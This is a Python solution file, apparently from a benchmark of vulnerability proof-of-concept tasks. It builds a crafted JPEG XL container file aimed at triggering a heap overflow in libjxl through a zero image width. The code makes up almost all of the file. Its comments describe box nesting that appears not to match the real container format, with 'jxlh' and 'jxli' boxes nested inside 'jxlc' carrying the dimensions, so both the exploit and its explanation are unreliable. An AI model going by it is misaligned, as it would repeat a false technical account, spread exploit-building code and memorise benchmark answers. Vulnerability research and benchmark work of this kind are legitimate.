import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """

        # The vulnerability in libjxl (oss-fuzz:42536679) is a failure to check for
        # zero-width or zero-height images before processing. This can lead to a
        # heap buffer overflow when memory is allocated for a zero-sized dimension
        # and later accessed.
        #
        # A simple way to specify a zero-width image is by using the JXL
        # container format (ISOBMFF-based), which has a 'jxlh' (JXL Header) box
        # where dimensions can be explicitly set. Crafting a raw codestream with
        # zero dimensions is difficult as the format seems designed to prevent it.
        #
        # The PoC consists of a minimal JXL container file with:
        # 1. 'ftyp' box: To identify the file type.
        # 2. 'jxlc' box: A container for the JXL data.
        # 3. 'jxlh' box: Inside 'jxlc', specifies image metadata, including a
        #                width of 0, which is the trigger for the vulnerability.
        # 4. 'jxli' box: Inside 'jxlc', contains a minimal, valid JXL codestream.
        #                The decoder will prioritize dimensions from 'jxlh' over
        #                the ones in the codestream.

        # 1. File Type Box ('ftyp')
        ftyp_box = (
            b'\x00\x00\x00\x18'  # Box size: 24 bytes
            b'ftyp'             # Box type
            b'jxl '             # Major brand
            b'\x00\x00\x00\x00'  # Minor version
            b'jxl '             # Compatible brand
            b'isom'             # Compatible brand
        )

        # 2a. JXL Header Box ('jxlh')
        width = 0  # The trigger for the vulnerability
        height = 1
        bits_per_sample = 8
        num_channels = 3
        
        # 'jxlh' is a "full box" with version and flags. Header is 12 bytes.
        jxlh_header = b'jxlh' + b'\x00\x00\x00\x00'  # Type, version (0), flags (0)
        jxlh_data = struct.pack('>IIBB', width, height, bits_per_sample, num_channels)
        jxlh_size = 12 + len(jxlh_data)
        jxlh_box = struct.pack('>I', jxlh_size) + jxlh_header + jxlh_data

        # 2b. JXL Codestream Box ('jxli')
        # A minimal 1x1 green pixel codestream.
        codestream = (
            b'\xff\x0a\x04\x20\x11\x80\x47\x00\x1e\x00\x00\xc4\xe5\x22'
            b'\x98\xc3\x73\x9b\x8a\xd3\xaf\x70'
        )
        # 'jxli' is a simple box. Header is 8 bytes.
        jxli_header = b'jxli'
        jxli_size = 8 + len(codestream)
        jxli_box = struct.pack('>I', jxli_size) + jxli_header + codestream

        # 2c. JXL Container Box ('jxlc')
        # 'jxlc' is a simple box. Header is 8 bytes.
        jxlc_content = jxlh_box + jxli_box
        jxlc_header = b'jxlc'
        jxlc_size = 8 + len(jxlc_content)
        jxlc_box = struct.pack('>I', jxlc_size) + jxlc_header + jxlc_content

        # 3. Assemble the final PoC file
        poc = ftyp_box + jxlc_box
        
        return poc